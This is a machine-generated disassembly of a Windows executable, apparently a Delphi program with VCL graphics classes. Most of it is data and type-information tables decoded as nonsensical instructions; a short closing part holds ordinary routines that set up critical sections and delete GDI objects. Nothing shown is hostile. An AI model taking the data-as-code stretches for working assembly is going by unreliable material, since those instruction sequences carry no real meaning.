add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
pop esi
rol [ eax ] 0x1
and al 0x0
jo r-xdata
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
outsd
je r-xdata
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x9074754f
nop
nop
movsb [ edi ] [ esi ]
iretd
imul esp [ gs : edi + 0x68 ] 0x40cf2c74
add al [ eax ]
push es
dec eax
jo r-xdata
rol [ eax ] 0x1
xchg esp eax
retn 0x44
imul esp [ ebx + 0x73 ] 0x90900000
mov eax 0xf0040d0
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
or eax 0x6e497370
jo r-xdata
push esp
inc edi
jb r-xdata
inc eax
inc ebx
insb
popad
jb r-xdata
inc ebx
add [ ecx * 8 + 0x10043 ] cl
std
call [ eax + 0xf0040e4 ]
into
inc esp
arpl [ esp + ecx * 4 - 0x30 ] si
inc eax
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
push 0x4f736369
bound ebp [ edx + 0x65 ]
jae r-xdata
dec ecx
outsb
add [ esp + ebp * 8 + 0x40 ] cl
add [ eax - 0x14 ] dh
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
popad
insd
sub al 0xcf
inc eax
imul esp [ ebx + 0x73 ] 0xcf3c0007
inc eax
add al al
in eax dx
inc eax
add ah bl
in eax dx
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
inc esp
add [ eax ] bl
rol [ eax + eax + 0x40 ] 0xe8
inc eax
add [ eax ] dl
into
inc ebx
add [ esi + ecx * 8 ] ch
inc ebx
add [ eax + ebp * 8 + 0xe0040 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
imul sp [ ebp + 0x72 ] 0xa63c
inc esp
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
andps xmm0 [ edi + 0x72 ]
popad
inc esi
jb r-xdata
nop
add [ eax ] al
add [ ecx ] 0x0
add eax 0x6f6c6f43
jb r-xdata
into
push [ eax + ebp * 8 + 0x40 ]
add [ 0x6e6f4654 ] al
je r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx * 8 + 0x200040 ] dh
jo r-xdata
add [ edi ] cl
in al 0x40
nop
rol [ fs : eax ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax ss
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x30 ] dh
inc eax
add [ eax - 0x30 ] bh
inc eax
insd
nop
add [ eax ] al
add [ eax ] eax
std
rol [ eax ] 0x1
and [ eax ] al
movsd [ edi ] [ esi ]
inc esp
add [ esp + ebp * 8 ] al
inc eax
sub_40cfb4
inc eax
add [ eax + 0x40cfbc90 ] dl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
add [ eax ] al
push 0x940043ac
retn 0x44
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + 0x70040cf ] bh
jo r-xdata
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
push ebx
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
je r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
add [ eax ] al
mov ah 0xd0
inc eax
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
imul esp [ ebx + 0x73 ] 0x90900000
nop
cmp cl dl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 + 0x40 ] al
add [ eax - 0x2f ] ch
inc eax
add [ eax ] al
add [ eax ] al
nop
nop
imul esp [ ebx + 0x73 ] 0x656a624f
add [ eax ] bl
add [ eax ] al
add [ eax - 0x54 ] ch
popad
jae r-xdata
add al dl
int3
inc esp
popad
jae r-xdata
add [ eax ] ah
in al dx
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
rol [ eax ] 0x1
pop es
add eax 0x6e6f4654
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x2f ] dl
inc eax
add [ esi - 0x2f ] bl
inc eax
add [ eax + eax ] ah
push 0x40d1
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp - 0x30 ] si
inc eax
add [ eax ] dh
movsb [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc ebx
add [ eax ] dl
into
inc ebx
add [ esi + ecx * 8 ] ch
inc esp
outsd
je r-xdata
inc esp
add [ eax ] bl
rol [ eax + eax - 0x30 ] 0xcc
add al 0xc0
inc esp
outsd
je r-xdata
inc eax
add [ eax ] bl
add [ eax ] al
rol [ eax ] 0x1
mov al dl
inc eax
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
sbb al dl
inc eax
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
pop esi
rol [ eax ] 0x1
and al 0x0
jo r-xdata
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
outsd
je r-xdata
pop es
jo r-xdata
imul esp [ gs : edi + 0x68 ] 0x40cf2c74
add al [ eax ]
push es
dec eax
jo r-xdata
rol [ eax ] 0x1
xchg esp eax
retn 0x44
imul esp [ ebx + 0x73 ] 0x90900000
mov eax 0xf0040d0
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
or eax 0x6e497370
jo r-xdata
push esp
inc edi
jb r-xdata
inc eax
inc ebx
insb
popad
jb r-xdata
inc ebx
add [ ecx * 8 + 0x10043 ] cl
std
call [ eax + 0xf0040e4 ]
into
inc esp
add [ esp + ebp * 8 + 0x40 ] cl
add [ eax - 0x14 ] dh
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
popad
insd
sub al 0xcf
inc eax
imul esp [ ebx + 0x73 ] 0xcf3c0007
inc eax
add al al
in eax dx
inc eax
add ah bl
in eax dx
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
inc esp
add [ eax ] bl
rol [ eax + eax + 0x40 ] 0xe8
inc eax
add [ eax ] dl
into
inc ebx
add [ esi + ecx * 8 ] ch
inc ebx
add [ eax + ebp * 8 + 0xe0040 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
imul sp [ ebp + 0x72 ] 0xa63c
inc esp
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
andps xmm0 [ edi + 0x72 ]
popad
inc esi
jb r-xdata
nop
jo r-xdata
add [ eax ] al
add [ ecx ] 0x0
add eax 0x6f6c6f43
jb r-xdata
into
push [ eax + ebp * 8 + 0x40 ]
add [ 0x6e6f4654 ] al
je r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx * 8 + 0x200040 ] dh
jo r-xdata
add [ edi ] cl
in al 0x40
nop
rol [ fs : eax ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax ss
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x30 ] dh
inc eax
add [ eax - 0x30 ] bh
inc eax
insd
nop
arpl [ esp + ecx * 4 - 0x30 ] si
inc eax
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
push 0x4f736369
bound ebp [ edx + 0x65 ]
jae r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] eax
std
rol [ eax ] 0x1
and [ eax ] al
movsd [ edi ] [ esi ]
inc esp
add [ esp + ebp * 8 ] al
inc eax
sub_40d207
into
inc eax
add [ eax - 0x13 ] bh
inc eax
add [ ebp + ebp * 8 + 0x10040 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
aam 0xec
inc eax
add [ eax ] al
in eax dx
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
xor ch ch
inc eax
add [ ebp + ebp * 8 + 0x40 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
insb
nop
nop
nop
mov ah 0xd2
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
rol [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcl dl 0x40
add [ eax + eax ] bl
add [ eax ] al
sbb al dl
inc eax
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x5c ] 0xee
inc eax
add [ eax ] dl
into
inc ebx
add [ esi + ecx * 8 ] ch
inc ebx
add [ eax + 0x40040ee ] dl
push esp
xor al 0xf1
inc eax
add [ eax - 0xf ] dl
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0xd3b49090
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
rol [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcl bl 0x40
add [ eax ] bl
add [ eax ] al
add [ eax ] bl
rol [ eax ] 0x1
xchg esp eax
retn 0x44
imul esp [ ebx + 0x73 ] 0xce140004
inc eax
add ah cl
out dx eax
inc eax
add al ch
out dx eax
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
push eax
outsb
nop
nop
nop
int3
add al 0x54
int3
sub_40d3a0
test al 0xc2
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax - 0x30 ] 0xf1
inc eax
add [ eax ] dl
into
inc ebx
add [ esi + ecx * 8 ] ch
inc ebx
add [ edx + esi * 8 ] al
inc eax
add [ esi ] al
push esp
inc edx
jb r-xdata
add [ eax ] al
pushfd
aam 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x580040d4 ] dl
add [ eax ] al
add [ eax - 0x54 ] ch
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x1c ] 0xf6
inc eax
add [ eax ] dl
into
inc ebx
add [ esi + ecx * 8 ] ch
inc ebx
add [ ecx * 8 - 0x1dbffbd ] cl
inc eax
add [ eax ] al
inc [ eax ]
in al 0xfc
inc eax
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
jae r-xdata
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
int3
jb r-xdata
outsd
rol [ fs : eax ] 0x1
or al 0x0
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx * 8 + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
aam 0x40
add [ eax ] bl
add [ eax ] al
push 0x940043ac
retn 0x44
aam 0x40
add [ edi ] al
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
jb r-xdata
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] 0x0
int3
rol [ eax ] cl
adc [ eax ] al
add bh bh
or bl bh
call 0x1411604
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
jae r-xdata
pop ss
inc ecx
add [ eax - 0x44 ] dl
inc esp
add [ eax - 0x44 ] dl
inc esp
add [ eax + ebx + 0x41 ] ah
outsb
nop
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
inc ebp
jbe r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2a ] bh
salc
jb r-xdata
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50030003 ] al
outsb
nop
nop
inc eax
aad 0x40
add [ eax ] cl
push cs
inc eax
add [ eax ] dl
add [ eax ] al
dec [ eax ]
sti
aam 0x40
add [ eax ] dh
movsb [ edi ] [ esi ]
inc ebx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax + eax * 8 ] al
imul esp [ ebx - 0x70 ] 0xd6789090
inc eax
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
outsb
inc eax
nop
add dh dl
outsb
imul esp [ ebx + 0x73 ] 0xd3c80004
inc eax
add [ eax + eax ] dl
add bh bh
sub bl bh
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
and eax 0x21d80041
inc ecx
add [ esi ] cl
imul esp [ ebx ] 0x300040d6
movsb [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
jae r-xdata
add ecx [ ebp + 0x73 ]
push es
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
je r-xdata
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx * 8 + 0x100040 ] dh
add [ eax ] al
add al [ eax ]
std
jo r-xdata
inc ecx
add [ eax - 0x44 ] dl
inc esp
add [ eax ] bl
push ebx
je r-xdata
push es
add [ eax + ebx + 0x41 ] bh
add [ eax - 0x44 ] dl
inc esp
add [ ecx + ebx ] dh
inc ecx
add [ eax - 0x44 ] dl
inc esp
add [ eax - 0x3fffbee7 ] dh
sbb [ ecx ] eax
push eax
mov esp 0x19f00044
inc ecx
add [ eax + 0x50004118 ] bl
sbb [ ecx ] eax
push eax
mov esp 0xbc500044
inc esp
add [ eax - 0x44 ] dl
inc esp
add [ eax - 0x44 ] dl
inc esp
add [ ecx ] al
add ch bh
push esp
sbb [ ecx ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
mov esp 0x18640044
inc ecx
imul ebp [ esi + 0x67 ] 0xd6009090
add [ 0x67617453 ] al
push cs
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
je r-xdata
push esp
push eax
jb r-xdata
mov [ ebp + 0x200044 ] ah
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
mov ah 0xd0
inc eax
add [ eax ] dl
add [ eax ] al
add [ edx ] al
add ch bh
inc esp
add [ eax ] bl
rol [ eax + eax - 0x6c ] 0x20
inc ecx
add al dl
and [ ecx ] al
imul esp [ ebx + 0x73 ] 0xe4900000
salc
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
salc
inc eax
add [ eax ] ah
xlat
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
xlat
inc eax
add [ eax ] dl
xlat
inc eax
add [ eax ] ah
add [ eax ] al
add [ eax - 0x54 ] ch
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
lodsb [ esi ]
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
jb r-xdata
inc eax
add [ eax - 0x2a ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
salc
push esp
push eax
jb r-xdata
push cs
jae r-xdata
dec ebp
inc eax
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2a ] ah
je r-xdata
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
push ebx
add [ eax + eax ] bl
add [ eax ] al
push 0x940043ac
add [ gs : bp + di ] cl
push eax
jb r-xdata
retn 0x44
outsb
je r-xdata
outsd
outsb
add al 0x42
jns r-xdata
int3
add [ gs : ecx ] cl
push edx
jb r-xdata
inc esp
add [ eax ] bl
rol [ eax + eax - 0x30 ] 0xcc
inc ebx
add [ eax ] dl
into
inc ebx
add ah cl
push ss
inc ecx
add [ ecx * 8 + 0x15f40043 ] cl
inc ecx
add [ eax ] bh
push ss
inc esp
add [ eax + eax * 8 ] al
ja r-xdata
outsd
ja r-xdata
adc al [ ecx ]
push edx
add eax 0x63655254
je r-xdata
inc edx
outsd
outsd
insb
popad
sub_40d706
cld
push [ eax - 0x13ffbede ]
and al [ ecx ]
or [ eax + edx * 2 + 0x69 ] dl
arpl [ ebp + esi * 2 + 0x72 ] si
nop
nop
nop
and bh dl
inc eax
add [ edi ] al
or [ eax + edx * 2 + 0x69 ] dl
arpl [ ebp + esi * 2 + 0x72 ] si
in al 0xd6
inc eax
add [ eax ] dh
movsb [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
insd
popad
nop
nop
nop
in al dx
xlat
jo r-xdata
add [ eax + 0x26 ] ch
inc ecx
add [ eax ] bh
push ss
inc ecx
add ah dl
daa
inc ecx
add [ eax ] bl
pop ss
inc ecx
add [ eax - 0x63ffbed8 ] al
sub [ ecx ] al
sub al 0x29
inc ecx
add [ eax + ebx + 0x41 ] bh
add al bh
sub [ ecx ] eax
sub [ ebx ] ch
inc ecx
add [ eax ] dl
das
inc ecx
add [ eax + 0x60004119 ] dh
xor [ ecx ] al
jo r-xdata
imul bp [ ebp + 0x49 ] 0x616d
nop
dec esp
fadd [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x40d8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 8 + 0x280040 ] ch
add [ eax ] al
mov ah 0xd5
inc eax
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax - 0x3c ] 0x26
inc ecx
add [ eax ] dl
into
inc ebx
add ah cl
push ss
inc ecx
add [ eax ] al
daa
inc ecx
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
xlat
inc eax
add [ eax + eax ] ah
add [ eax ] al
inc eax
xlat
inc eax
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x8 ] 0x26
inc ecx
add [ esi + 0x41 ] bl
add [ esi ] cl
push esp
dec ebp
je r-xdata
imul esp [ ebx + 0x73 ] 0x8c900000
xlat
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x80040d7 ] dl
add [ eax ] al
add al cl
movsd [ edi ] [ esi ]
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ eax - 0x44 ] dl
inc esp
add [ esp + edx * 2 ] cl
push ebx
push 0x64657261
dec ecx
push esp
dec ebp
je r-xdata
inc ecx
add [ eax + 0x32 ] dl
inc ecx
add [ eax + 0x30004118 ] bl
inc ecx
add [ eax - 0x2bffbed6 ] cl
inc ecx
add ah ah
xor al 0x41
add [ eax + 0x9004135 ] dl
push esp
dec ebp
je r-xdata
inc eax
cmp al [ ecx ]
sar [ edx ] 0x41
add [ esp + edx * 2 ] cl
imul bp [ ebp + 0x4c ] 0x40d8
add [ esi + edx * 8 + 0x40 ] dh
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax - 0x63ffbb3e ] ch
retn 0x44
imul bp [ ebp - 0x70 ] 0xbc90
fadd [ eax ]
pop es
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
nop
nop
nop
mov cl bl
inc eax
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fiadd [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
imul esp [ ebx + 0x73 ] 0xd9280000
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 8 ] ch
inc eax
add [ eax + eax ] dh
add [ eax - 0x29 ] al
inc eax
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x40 ] 0x3a
inc ecx
add al al
cmp al [ ecx ]
or al 0x54
sub_40d9d9
push edx
inc ecx
add [ esp + 0x525c0041 ] cl
inc ecx
add [ esp + 0x4c8c0041 ] ch
inc ecx
add [ eax + 0x4d ] al
inc ecx
add [ eax ] bh
pop ebx
inc ecx
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x40da0070
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x40d98870
add [ esi + edx * 8 + 0x40 ] dh
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
popad
nop
enter 0x40da 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xdb
jo r-xdata
push esp
dec ecx
arpl [ edi + 0x6e ] bp
nop
nop
xor al 0xdb
inc eax
add [ edi ] al
add eax 0x6f634954
outsb
enter 0x40da 0x0
je r-xdata
add [ ecx + ebp * 2 + 0x41 ] al
add [ ebx + ebp * 2 ] ch
inc ecx
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x500416b ] cl
inc eax
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
fild [ eax ]
sub al 0x0
add [ eax ] al
mov ah 0xd5
inc eax
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x34 ] 0x66
inc ecx
add [ eax ] dl
into
inc ebx
add ah cl
push ss
inc ecx
add [ eax + 0x66 ] dh
inc ecx
add ah cl
inc ecx
add [ eax ] bh
push ss
inc ecx
add al ch
inc cx
add [ eax ] bl
pop ss
inc ecx
add [ edi ] bh
inc ecx
add [ edi + 0x18640041 ] dl
inc ecx
add [ eax + ebx + 0x41 ] bh
add al al
inc ecx
add [ ecx + ebx ] dh
inc ecx
add [ edx + ebp * 2 + 0x19b00041 ] dh
inc ecx
add al ch
push 0x41
add al bh
push 0x41
add al dh
sbb [ ecx ] eax
cwde
sbb [ ecx ] al
push eax
sbb [ ecx ] eax
inc esp
imul eax [ ecx ] sub_416b2c
push 0x8800416b
imul eax [ ecx ] 0x5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 8 ] dh
imul esp [ ebx + 0x73 ] 0x90900000
inc esp
add [ eax - 0x63ffbb3e ] ch
retn 0x44
jo r-xdata
insb
fiadd [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
nop
nop
inc eax
add [ eax ] bl
add [ eax ] al
add [ eax - 0x29 ] al
inc eax
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x68 ] 0x65
inc ecx
add [ ebp + 0x540a0041 ] ah
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
add [ eax + eax * 8 ] al
inc esp
add [ eax ] bl
rol [ eax + eax + 0x3c ] 0xdc
inc eax
add [ eax ] dl
push esp
push edx
jae r-xdata
imul esp [ ebx + 0x73 ] 0x8b550000
in al dx
push ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cld
pop ecx
pop ecx
pop ebp
retn
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
je r-xdata
nop
nop
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
push eax
call DeleteObject
or al 0x36
inc edi
add [ ecx + ecx - 0x75 ] dh
inc ebp
cld
nop
nop
sub_40db50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_40db74
rcr bl 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
fild [ eax ]
and al 0x0
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
sub_40dbe8
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x8 ] cx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] ax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call InitializeCriticalSection
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
